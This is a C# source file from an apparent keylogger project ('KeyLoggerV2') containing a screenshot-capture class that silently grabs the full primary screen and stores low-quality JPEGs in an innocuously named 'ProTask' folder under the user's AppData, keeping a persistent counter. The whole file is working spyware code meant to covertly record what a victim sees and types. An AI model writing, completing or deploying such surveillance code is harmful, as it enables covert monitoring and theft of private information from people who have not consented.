using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerV2
{
    class ImageCapture
    {
        public void Save(object source, EventArgs e, int counter)
        {
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            int quality = 20;

            Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height,
                PixelFormat.Format32bppArgb);

            var screen = Graphics.FromImage(image);

            try
            {
                screen.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, 
                    CopyPixelOperation.SourceCopy);

                string pathToSave = Directory.CreateDirectory(destination + '\\' + "ProTask").FullName;

                string imgPath = pathToSave + '\\' + 't' + counter + ".jpg";

                EncoderParameter par = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                ImageCodecInfo codecs = FindEncoder("image/jpeg");

                EncoderParameters encParams = new EncoderParameters(1);
                encParams.Param[0] = par;

                image.Save(imgPath, codecs, encParams);

                Properties.Settings.Default.counter++;
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();
            }
            catch (Exception)
            {
                
                throw;
            }
        }

        public ImageCodecInfo FindEncoder(string mimeType)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

            for (int i = 0; i < codecs.Length; i++)
            {
                if (codecs[i].MimeType == mimeType)
                {
                    return codecs[i];
                }
            }
            return null;
        }
    }
}
